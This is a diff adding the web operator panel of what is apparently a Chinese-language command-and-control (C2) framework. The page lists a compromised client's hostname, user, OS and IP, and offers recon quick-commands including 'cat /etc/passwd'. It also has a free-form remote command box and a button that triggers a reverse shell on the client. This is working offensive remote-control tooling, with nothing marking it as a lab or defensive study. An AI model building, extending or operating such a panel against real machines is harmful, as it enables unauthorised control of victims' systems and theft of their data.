@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Framework - 客户端管理</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: #21262d;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+        }
+
+        .header h1 {
+            color: #58a6ff;
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+
+        .back-btn {
+            background: #21262d;
+            color: #c9d1d9;
+            padding: 8px 16px;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .back-btn:hover {
+            background: #30363d;
+        }
+
+        .client-info {
+            background: #21262d;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+            margin-bottom: 30px;
+        }
+
+        .client-info h2 {
+            color: #f0f6fc;
+            margin-bottom: 20px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        .info-item {
+            background: #161b22;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+        }
+
+        .info-item label {
+            display: block;
+            color: #8b949e;
+            font-size: 0.9em;
+            margin-bottom: 5px;
+        }
+
+        .info-item span {
+            color: #f0f6fc;
+            font-weight: 500;
+        }
+
+        .command-section {
+            background: #21262d;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+            margin-bottom: 30px;
+        }
+
+        .command-section h2 {
+            color: #f0f6fc;
+            margin-bottom: 20px;
+        }
+
+        .command-form {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .command-input {
+            flex: 1;
+            padding: 10px;
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            color: #c9d1d9;
+            font-family: 'Courier New', monospace;
+        }
+
+        .command-input:focus {
+            outline: none;
+            border-color: #58a6ff;
+        }
+
+        .btn {
+            background: #238636;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9em;
+        }
+
+        .btn:hover {
+            background: #2ea043;
+        }
+
+        .btn-danger {
+            background: #da3633;
+        }
+
+        .btn-danger:hover {
+            background: #f85149;
+        }
+
+        .results-section {
+            background: #21262d;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+        }
+
+        .results-section h2 {
+            color: #f0f6fc;
+            margin-bottom: 20px;
+        }
+
+        .command-result {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+
+        .result-header {
+            background: #0d1117;
+            padding: 10px 15px;
+            border-bottom: 1px solid #30363d;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .result-command {
+            font-family: 'Courier New', monospace;
+            color: #58a6ff;
+            font-weight: 500;
+        }
+
+        .result-time {
+            color: #8b949e;
+            font-size: 0.9em;
+        }
+
+        .result-output {
+            padding: 15px;
+        }
+
+        .output-stdout {
+            background: #0d1117;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            white-space: pre-wrap;
+            color: #7ee787;
+            margin-bottom: 10px;
+        }
+
+        .output-stderr {
+            background: #0d1117;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            white-space: pre-wrap;
+            color: #f85149;
+            margin-bottom: 10px;
+        }
+
+        .exit-code {
+            color: #8b949e;
+            font-size: 0.9em;
+        }
+
+        .exit-code.success {
+            color: #7ee787;
+        }
+
+        .exit-code.error {
+            color: #f85149;
+        }
+
+        .no-results {
+            text-align: center;
+            padding: 40px;
+            color: #8b949e;
+        }
+
+        .quick-commands {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .quick-cmd {
+            background: #21262d;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85em;
+        }
+
+        .quick-cmd:hover {
+            background: #30363d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/" class="back-btn">← 返回主页</a>
+        
+        <div class="header">
+            <h1>客户端管理</h1>
+        </div>
+
+        <div class="client-info">
+            <h2>客户端信息</h2>
+            <div class="info-grid">
+                <div class="info-item">
+                    <label>客户端ID</label>
+                    <span><code>{{ client.id }}</code></span>
+                </div>
+                <div class="info-item">
+                    <label>主机名</label>
+                    <span>{{ client.hostname }}</span>
+                </div>
+                <div class="info-item">
+                    <label>用户名</label>
+                    <span>{{ client.username }}</span>
+                </div>
+                <div class="info-item">
+                    <label>操作系统</label>
+                    <span>{{ client.os }} ({{ client.arch }})</span>
+                </div>
+                <div class="info-item">
+                    <label>IP地址</label>
+                    <span>{{ client.ip }}</span>
+                </div>
+                <div class="info-item">
+                    <label>连接时间</label>
+                    <span>{{ client.connected_at.format("%Y-%m-%d %H:%M:%S") }}</span>
+                </div>
+                <div class="info-item">
+                    <label>最后活动</label>
+                    <span>{{ client.last_seen.format("%Y-%m-%d %H:%M:%S") }}</span>
+                </div>
+                <div class="info-item">
+                    <label>状态</label>
+                    <span>
+                        {% if (chrono::Utc::now().timestamp() - client.last_seen.timestamp()) < 60 %}
+                            <span style="color: #7ee787;">在线</span>
+                        {% else %}
+                            <span style="color: #f85149;">离线</span>
+                        {% endif %}
+                    </span>
+                </div>
+            </div>
+        </div>
+
+        <div class="command-section">
+            <h2>命令执行</h2>
+            
+            <div class="quick-commands">
+                <button class="quick-cmd" onclick="setCommand('whoami')">whoami</button>
+                <button class="quick-cmd" onclick="setCommand('pwd')">pwd</button>
+                <button class="quick-cmd" onclick="setCommand('ls -la')">ls -la</button>
+                <button class="quick-cmd" onclick="setCommand('ps aux')">ps aux</button>
+                <button class="quick-cmd" onclick="setCommand('netstat -an')">netstat -an</button>
+                <button class="quick-cmd" onclick="setCommand('uname -a')">uname -a</button>
+                <button class="quick-cmd" onclick="setCommand('cat /etc/passwd')">cat /etc/passwd</button>
+            </div>
+
+            <div class="command-form">
+                <input type="text" id="commandInput" class="command-input" placeholder="输入要执行的命令..." />
+                <button class="btn" onclick="executeCommand()">执行</button>
+                <button class="btn btn-danger" onclick="startReverseShell()">反弹Shell</button>
+            </div>
+        </div>
+
+        <div class="results-section">
+            <h2>命令执行结果</h2>
+            <button class="btn" onclick="refreshResults()" style="float: right; margin-bottom: 20px;">刷新结果</button>
+            
+            {% if commands.is_empty() %}
+                <div class="no-results">
+                    <h3>暂无命令执行记录</h3>
+                    <p>执行命令后，结果将显示在这里</p>
+                </div>
+            {% else %}
+                {% for cmd in commands %}
+                <div class="command-result">
+                    <div class="result-header">
+                        <span class="result-command">{{ cmd.command }}</span>
+                        <span class="result-time">{{ cmd.executed_at.format("%Y-%m-%d %H:%M:%S") }}</span>
+                    </div>
+                    <div class="result-output">
+                        {% if !cmd.stdout.is_empty() %}
+                            <div class="output-stdout">{{ cmd.stdout }}</div>
+                        {% endif %}
+                        {% if !cmd.stderr.is_empty() %}
+                            <div class="output-stderr">{{ cmd.stderr }}</div>
+                        {% endif %}
+                        <div class="exit-code {% if cmd.exit_code == 0 %}success{% else %}error{% endif %}">
+                            退出码: {{ cmd.exit_code }}
+                        </div>
+                    </div>
+                </div>
+                {% endfor %}
+            {% endif %}
+        </div>
+    </div>
+
+    <script>
+        function setCommand(command) {
+            document.getElementById('commandInput').value = command;
+        }
+
+        async function executeCommand() {
+            const command = document.getElementById('commandInput').value.trim();
+            if (!command) {
+                alert('请输入命令');
+                return;
+            }
+
+            try {
+                const response = await fetch(`/api/clients/{{ client.id }}/commands`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        client_id: '{{ client.id }}',
+                        command: command,
+                        args: []
+                    })
+                });
+
+                if (response.ok) {
+                    alert('命令已发送');
+                    document.getElementById('commandInput').value = '';
+                    // 3秒后刷新结果
+                    setTimeout(refreshResults, 3000);
+                } else {
+                    alert('发送命令失败');
+                }
+            } catch (error) {
+                alert('发送命令时出错: ' + error.message);
+            }
+        }
+
+        async function startReverseShell() {
+            if (confirm('确定要启动反弹Shell吗？')) {
+                try {
+                    const response = await fetch(`/api/clients/{{ client.id }}/commands`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            client_id: '{{ client.id }}',
+                            command: 'reverse_shell',
+                            args: []
+                        })
+                    });
+
+                    if (response.ok) {
+                        alert('反弹Shell请求已发送');
+                    } else {
+                        alert('发送反弹Shell请求失败');
+                    }
+                } catch (error) {
+                    alert('发送请求时出错: ' + error.message);
+                }
+            }
+        }
+
+        function refreshResults() {
+            location.reload();
+        }
+
+        // 回车键执行命令
+        document.getElementById('commandInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                executeCommand();
+            }
+        });
+
+        // 自动刷新结果
+        setInterval(refreshResults, 30000);
+    </script>
+</body>
+</html>
